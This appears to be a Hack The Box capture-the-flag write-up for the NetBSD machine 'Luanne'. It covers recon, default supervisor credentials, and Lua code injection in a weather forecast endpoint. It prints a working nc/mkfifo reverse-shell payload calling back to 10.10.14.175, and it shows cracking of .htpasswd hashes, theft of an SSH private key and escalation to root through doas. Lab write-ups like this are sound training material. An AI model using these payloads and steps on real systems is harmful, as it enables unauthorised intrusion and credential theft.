# Luanne

## nmap -sC -sV -oA luanne.nmap luanne.htb

[Nmap results][1] The host is a NetBSD server with two http server on port 80 and 9001. Both require authentication to access the pages

The webserver on port 80 has a robot.txt file:

```txt
User-agent: *
Disallow: /weather  #returning 404 but still harvesting cities 
```

## gobuster dir -u "http://luanne.htb/weather" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o luanne-dir.txt 

[dirbuster results][2] found a forecast page 

## Burpsuite

Analizyng requests with burpsuit seems that username and password are sent to server in base64 encoding in "Authorization" header

Searching the internet the default creds for `supervisor medusa` that is listening on port 9001 are ***user:123*** so we can get in the supervisor console.

## supervisor

Here we can see by clicking on processes the process running on the machine:

```

USER         PID %CPU %MEM    VSZ   RSS TTY   STAT STARTED    TIME COMMAND
root           0  0.0  0.2      0 12472 ?     DKl   4:14PM 0:02.96 [system]
root           1  0.0  0.0  19852  1528 ?     Is    4:14PM 0:00.01 init 
root         163  0.0  0.0  32528  2288 ?     Is    4:14PM 0:00.04 /usr/sbin/syslogd -s 
r.michaels   185  0.0  0.0  34996  1984 ?     Is    4:15PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www 
nginx        271  0.0  0.1  33936  3316 ?     I     4:15PM 0:22.24 nginx: worker process 
root         298  0.0  0.0  19704  1328 ?     Is    4:14PM 0:00.00 /usr/sbin/powerd 
root         299  0.0  0.0  33368  1828 ?     Is    4:15PM 0:00.00 nginx: master process /usr/pkg/sbin/nginx 
_httpd       336  0.0  0.3 120768 16448 ?     Ss    4:15PM 0:03.86 /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 
root         348  0.0  0.0  71344  2924 ?     Is    4:15PM 0:00.01 /usr/sbin/sshd 
_httpd       376  0.0  0.0  34956  1996 ?     Is    4:15PM 0:02.36 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
root         402  0.0  0.0  20216  1656 ?     Is    4:15PM 0:00.03 /usr/sbin/cron 
_httpd     22092  0.0  0.0  21012  1352 ?     O     7:22PM 0:00.00 /usr/bin/egrep ^USER| \\[system\\] *$| init *$| /usr/sbin/sshd *$| /usr/sbin/syslogd -s *$| /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 *$| /usr/sbin/cron *$| /usr/sbin/powerd *$| /usr/libexec/httpd -u -X -s.*$|^root.* login *$| /usr/libexec/getty Pc ttyE.*$| nginx.*process.*$ 
root         421  0.0  0.0  19780  1592 ttyE1 Is+   4:15PM 0:00.00 /usr/libexec/getty Pc ttyE1 
root         388  0.0  0.0  19780  1584 ttyE2 Is+   4:15PM 0:00.00 /usr/libexec/getty Pc ttyE2 
root         433  0.0  0.0  19784  1588 ttyE3 Is+   4:15PM 0:00.00 /usr/libexec/getty Pc ttyE3
```

And we found our possible user `r.michaels` that is running a lua server on port 3000 but it's reacheble only from inside the machine (Possible way to root (?)) 

Now we have a user but we need a password.

## Weather page 

Since we found that in the robot.txt there is a /weather dir and dirbuster found a `forecast` page wi can dig in more details.

`http://luanne.htb/weather/forecast?city=list` give use some city to get weather forecast, trying escaping the url we get a lua error probably is the same server that we saw before in the process list.

Putting a `")` after the city name server responds with ` expected ',' or '}' after property value in object at line 1 column 45` so let's try to inject a reverse shell with burp.

Remember this is a NetBSD distro so the usual reverse shell will not work, instead use:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.175 4242 >/tmp/f`

`;os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.175 4242 >/tmp/f');--`

Once in the shell we find a file `.htpasswd` containing a md5 hash -> `webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0` 

cracking with `hashcat -m 500 hash.txt --user -O rockyou.txt.gz` -> ***webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0:iamthebest***

with this credential we can enter the index.html page.

We can use this credential also to authorize requests for the devel version on port 3001 which is launched with `-U r.michaels` flag that means we can access users files by url: `http://127.0.0.1:3001/~r.michaels`

and trying some dirs we can find the private key for ssh `r.michales` with : `curl --user webapi_user:iamthebest 127.0.0.1:3001/~r.michaels/id_rsa`

## R. Michaels

inside r.michaels home there is a backup directory in which there is an encrypted tar that can be decrypted by using `netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/backup.tar.gz`

Inside the devel backup the `.htpasswd` has a different hash `webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.` cracking again we obtain the password ***webapi_user:littlebear***

Using this password we can get a `ksh` shell as root. 

Note in this machine there no `sudo` but there is `doas`

![htbbadge](https://www.hackthebox.eu/badge/image/272787)

[//]: #links
[1]: nmap/luanne.nmap
[2]: luanne-dir.txt
